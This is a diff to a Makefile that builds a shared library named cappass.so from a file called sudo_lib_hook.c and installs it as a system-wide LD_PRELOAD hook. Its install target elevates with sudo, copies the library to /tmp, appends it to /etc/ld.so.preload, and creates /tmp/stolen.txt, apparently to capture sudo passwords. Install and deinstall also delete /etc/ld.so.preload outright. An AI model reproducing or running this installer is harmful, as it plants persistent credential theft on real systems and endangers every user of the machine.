@@ -2,7 +2,19 @@
 CC = gcc
 CFLAGS = -Wall -fPIC -shared
 LIBS = -ldl
-RM = rm -f
+UID = id -u
+DEL = rm -f
+TOUCH = touch
+COPY = cp
+PERMS = chmod
+ECHO = echo
+RAISE = sudo make
+LDSOPRE = /etc/ld.so.preload
+INSTLOC = /tmp
+SLNAME = cappass.so
+PASSFILE = stolen.txt
+LIBLOC = $(INSTLOC)/$(SLNAME)
+PFLOC = $(INSTLOC)/$(PASSFILE)
 
 all: cappass.so
 
@@ -12,24 +24,23 @@ cappass.so: sudo_lib_hook.c
 # Phony target for cleaning up generated files
 .PHONY: clean
 clean:
-	$(RM) cappass.so
-	$(RM) /tmp/stolen.txt
+	$(DEL) $(SLNAME) $(PFLOC)
 
 install: all
-    ifneq ($(shell id -u), 0)
-	sudo make $@
+    ifneq ($(shell $(UID)), 0)
+	$(RAISE) $@
     else
-	$(RM) /tmp/cappass.so /etc/ld.so.preload /tmp/stolen.txt
-	cp cappass.so /tmp/cappass.so
-	chmod a+rwx /tmp/cappass.so
-	touch /tmp/stolen.txt
-	chmod a+rwx /tmp/stolen.txt
-	echo "/tmp/cappass.so" >> /etc/ld.so.preload
+	$(DEL) $(LIBLOC) $(LDSOPRE) $(PFLOC)
+	$(COPY) $(SLNAME) $(LIBLOC)
+	$(PERMS) 666 $(LIBLOC)
+	$(TOUCH) $(PFLOC)
+	$(PERMS) 644 $(PFLOC)
+	$(ECHO) $(LIBLOC) >> $(LDSOPRE)
    endif
 
 deinstall: all
-    ifneq ($(shell id -u), 0)
-	sudo make $@
+    ifneq ($(shell $(UID)), 0)
+	$(RAISE) $@
     else
-	$(RM) /tmp/cappass.so /etc/ld.so.preload /tmp/stolen.txt
+	$(DEL) $(LIBLOC) $(LDSOPRE) $(PFLOC)
     endif
